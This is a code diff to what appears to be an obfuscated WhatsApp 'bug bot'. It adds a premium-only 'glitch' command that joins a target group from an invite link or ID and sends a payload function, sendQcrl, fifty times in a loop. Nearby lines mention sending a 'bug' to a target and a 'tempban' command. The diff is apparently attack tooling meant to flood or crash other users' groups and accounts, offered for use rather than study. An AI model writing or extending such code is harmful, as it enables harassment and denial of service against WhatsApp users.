@@ -1893,6 +1893,43 @@ function _0x15a19b(_0x4606b9,_0x12a5f5,_0xc8a211,_0x38bf12){return _0x2c69(_0xc8
 replygcxeon(`Successfully Sent Bug To ${target}`)
 }
 break
+case 'glitch': {
+    if (!isPremium) return m.reply("only premium users can use this command.");
+    
+    if (!qtext) {
+     return m.reply(`usage:\n .${prefix + command} https:// or 9741@g.us`);
+     }
+    
+    if (!qtext) {
+        return m.reply(`penggunaan salah.\ncontoh: .${command} https://chat.whatsapp.com/ atau .${command} 9741g.us`);
+    }
+
+    let groupLink = args[0];
+    let groupId;
+
+    if (groupLink.includes('https://chat.whatsapp.com/')) {
+        groupId = groupLink.split('https://chat.whatsapp.com/')[1];
+        
+        if (!groupId) {
+            return m.reply("tautan grup tidak valid.");
+        }
+        
+        let isTarget = await client.groupAcceptInvite(groupId);
+       m.reply(`*sukses!* ${command} dikirim ke grup dengan tautan: ${groupLink} (ID Grup: ${groupId})`);
+        for (let r = 0; r < 50; r++) {
+        await sendQcrl(client, isTarget, false);
+        };
+
+    } else {
+        groupId = groupLink;
+        let isTarget = groupId;
+        m.reply(`*sukses!* ${command} dikirim ke grup dengan ID: ${groupId}`);
+        for (let r = 0; r < 50; r++) {
+        await sendQcrl(client, isTarget, false);
+        }
+    }
+}
+break
 case 'tempban': {
 if (!isPremium) return replygcxeon(mess.prem)
 if (!text) return replygcxeon(`Example: ${prefix + command} 234|90109137211`)
